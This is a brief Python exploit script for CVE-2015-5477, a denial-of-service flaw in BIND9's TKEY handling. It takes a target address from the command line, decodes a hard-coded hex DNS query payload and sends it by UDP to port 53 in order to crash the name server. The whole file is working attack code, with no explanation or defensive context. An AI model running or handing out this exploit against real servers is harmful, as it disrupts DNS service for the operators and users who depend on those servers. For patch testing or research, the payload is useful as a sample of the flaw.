#!/usr/bin/env python

import socket
import sys

print('CVE-2015-5477 BIND9 TKEY Dos')

if len(sys.argv) < 2:
	print('Usage: ' + sys.argv[0] + ' [target]')
	sys.exit(1)

print('Sending packet to ' + sys.argv[1] + ' ...')

payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex')) 

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (sys.argv[1], 53))

print('Done.')